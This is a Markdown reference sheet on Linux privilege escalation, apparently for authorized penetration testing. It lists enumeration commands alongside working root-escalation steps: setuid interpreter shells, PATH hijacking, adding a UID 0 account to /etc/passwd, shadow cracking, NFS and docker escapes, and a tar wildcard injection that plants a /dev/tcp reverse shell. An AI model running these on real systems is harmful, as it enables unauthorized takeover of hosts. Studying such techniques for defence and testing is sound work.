# Linux Privilege Escalation

> Turn an existing permission, misconfiguration, or vulnerable component into
> execution as a more privileged user (usually root). Always **enumerate first**,
> map each finding to a known technique, then take the shortest working path.
> [GTFOBins](https://gtfobins.github.io/) is the reference for abusing a specific binary.

## Enumeration

| command | usage |
| ------- | ----- |
| `id` | current UID, GID, groups |
| `sudo -l` | commands allowed via sudo (the first thing to check) |
| `cat /etc/os-release; uname -a` | distribution, kernel, architecture |
| `hostname; ip addr; ip route` | host identity, interfaces, routes |
| `ps auxww` | running processes + full command lines |
| `ss -lntup` | listening TCP/UDP sockets |
| `systemctl --type=service --state=running` | running services |
| `find / -perm -4000 -type f 2>/dev/null` | SUID binaries |
| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries |
| `getcap -r / 2>/dev/null` | files with Linux capabilities |
| `cat /etc/crontab; ls -la /etc/cron.*` | system cron jobs |
| `find / -type f -writable 2>/dev/null` | writable files |
| `find / -type d -writable 2>/dev/null` | writable directories |
| `ls -la /etc/passwd /etc/shadow /etc/sudoers.d` | perms on key account/sudo files |
| `getent passwd` | all account records |

### Automated enumeration

| tool | usage |
| ---- | ----- |
| `./linpeas.sh` | broad LPE enumeration; read the red/yellow highlights |
| `./pspy64` | watch processes & cron without root (catches short-lived jobs) |
| `./linux-exploit-suggester.sh` | compare kernel/system against known exploits |

## SUID / SGID Abuse

> A SUID binary runs with its **owner's** effective UID (root-owned = runs as root);
> SGID uses the file's group. Find one, then check its GTFOBins **SUID** entry.

| command | usage |
| ------- | ----- |
| `find / -perm -4000 -type f 2>/dev/null` | find SUID executables |
| `find / -perm -2000 -type f 2>/dev/null` | find SGID executables |
| `ls -l <path>` | confirm owner, group, permission bits |
| `file <path>` | binary format / architecture |

```bash
strings <path> 2>/dev/null | head      # quick look at embedded strings/paths
```

> Only the **SUID** (or **SGID**) section of a GTFOBins entry applies, and only when
> the local binary actually carries that bit.

## Sudo Misconfiguration

> `sudo -l` is the highest-value check on the box. Any allowed command with a
> GTFOBins **sudo** entry is usually a direct root shell.

| command | usage |
| ------- | ----- |
| `sudo -l` | allowed commands, run-as users, tags (`NOPASSWD`, `SETENV`) |
| `sudo <allowed-command>` | run a permitted command (check its GTFOBins sudo entry) |
| `sudo -u <user> <command>` | run as a permitted target user |
| `sudo -V` | sudo version (match against CVEs) |

| lead | technique |
| ---- | --------- |
| GTFOBins entry exists | invoke the allowed binary's documented shell escape |
| `SETENV` / `env_keep` in `sudo -l` | preserved env vars can alter a permitted program |
| `LD_PRELOAD` (with `SETENV`, dynamically-linked target) | preload a malicious `.so` that spawns a shell |
| sudo version CVE | match `sudo -V` + the distro's **patched package revision**, not just upstream version |

## Cron Job Abuse

> A root cron job that runs a script you can write — or resolves a command by an
> unsafe `PATH` — is a clean escalation. Confirm it actually runs as root (`pspy`).

| command | usage |
| ------- | ----- |
| `cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly` | find scheduled jobs |
| `ls -l <script>` | check script owner / write permission |
| `namei -l <script>` | permissions on every path component |
| `cat <script>` | read the scheduled script |

```bash
grep -RnE 'PATH=|/bin/sh|bash|tar|backup' /etc/cron* 2>/dev/null   # common job patterns
```

## Linux Capabilities Abuse

> Capabilities grant slices of root power to a binary without the SUID bit. Check
> the GTFOBins **Capabilities** entry for the exact binary `getcap` reports.

| command | usage |
| ------- | ----- |
| `getcap -r / 2>/dev/null` | enumerate file capabilities |
| `getcap <path>` | inspect one executable |

| capability | significance |
| ---------- | ------------ |
| `cap_setuid+ep` | process can set UID 0 — an interpreter (python/perl) with this = root |
| `cap_dac_read_search+ep` | bypass file-read / directory-search checks (read any file) |
| `cap_dac_override+ep` | bypass file permission checks for most operations |
| `cap_sys_admin+ep` | broad admin capability; impact depends on operation/namespace |

```bash
# example: python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## PATH Hijacking

> Works when a **privileged** script calls a command by name (no absolute path)
> and a directory you can write to comes earlier in that program's `PATH`.

| command | usage |
| ------- | ----- |
| `echo "$PATH"` | current search order |
| `command -v <tool>` | which executable resolves now |
| `find <dir> -maxdepth 1 -type f -writable 2>/dev/null` | writable files in a PATH dir |

```bash
# drop a fake binary earlier in PATH, then trigger the privileged job
echo '/bin/bash' > /writable/dir/<cmd>; chmod +x /writable/dir/<cmd>
export PATH=/writable/dir:$PATH
```

## Writable `/etc/passwd` / Readable `/etc/shadow`

> Writable `/etc/passwd` = instant root (add a UID 0 account). Readable `/etc/shadow`
> = crack hashes offline.

| command | usage |
| ------- | ----- |
| `ls -l /etc/passwd /etc/shadow` | check account-file permissions |
| `test -w /etc/passwd && echo writable` | is `/etc/passwd` writable? |
| `openssl passwd -6 '<password>'` | generate a SHA-512 crypt hash |

```bash
# add a root user to a writable /etc/passwd  (record: name:hash:UID:GID:comment:home:shell)
echo 'pwn:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwn

# readable /etc/shadow -> crack offline
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

## Kernel Exploits

> Last resort — risky and can crash the box. Match the **exact** kernel build and
> prerequisites; a version in range is not proof of vulnerability.

| command | usage |
| ------- | ----- |
| `uname -a; uname -r` | kernel release, architecture |
| `cat /etc/os-release` | distribution + patch level |
| `./linux-exploit-suggester.sh` | candidate exploits for this kernel |

```bash
gcc exploit.c -o exploit        # read the source first; compile for the target arch
file exploit; ./exploit
```

## NFS `no_root_squash`

> If an export has `no_root_squash`, client root is **not** downgraded — mount it as
> root and plant a SUID binary that the server executes with root privileges.

| command | usage |
| ------- | ----- |
| `showmount -e <ip>` | list exports on the NFS server |
| `cat /etc/exports 2>/dev/null` | check export options (look for `no_root_squash`) |
| `mount -t nfs <ip>:<export> <mountpoint>` | mount the export locally (as root) |

```bash
# on the mount, drop a root-owned SUID shell, then run it on the target
cp /bin/bash <mountpoint>/rootbash; chmod +s <mountpoint>/rootbash
# on the target:  /path/rootbash -p
```

## Wildcard / Tar Cronjob Injection

> An unquoted `*` is expanded by the shell before the command runs. Some tools (e.g.
> `tar`) read option-looking filenames as options, so a privileged job archiving a
> directory you can write to is exploitable.

| command | usage |
| ------- | ----- |
| `cat <script>` | check quoting / wildcard use in the job |
| `ls -la <dir>` | the working directory the job runs over |

```bash
# tar --checkpoint-action: drop these as filenames in the archived dir
echo 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

## Docker / LXD Group → Root

> Membership in `docker` or `lxd` is effectively root: the daemon runs as root and
> can mount the host filesystem into a container.

| command | usage |
| ------- | ----- |
| `id; groups` | check for `docker` / `lxd` membership |
| `docker images; lxc image list` | available images |

```bash
# docker: mount host root into a container as root
docker run -v /:/mnt --rm -it <image> chroot /mnt sh
```

## Writable Services & Other Leads

| command | usage |
| ------- | ----- |
| `systemctl list-timers --all` | systemd timers |
| `systemctl cat <service>` | unit file + drop-ins |
| `systemctl show <service> -p User -p ExecStart -p FragmentPath` | service exec context |
| `find / -type f -writable 2>/dev/null` | writable files (config, scripts, units) |
| `getfacl <path>` | POSIX ACLs (access the mode bits don't show) |
| `namei -l <path>` | permissions on each path component |

## General Tips

- Start every box with `id`, `sudo -l`, kernel/OS, SUID/SGID, capabilities, cron, groups, writable paths.
- Search GTFOBins for the exact binary and the right context (**SUID**, **sudo**, **Capabilities**).
- A writable file only matters if a **privileged** process consumes it — trace the full chain.
- For CVEs, match the distro's patched package revision and prerequisites, not just the upstream version.
- Only run this against systems you are authorized to test.
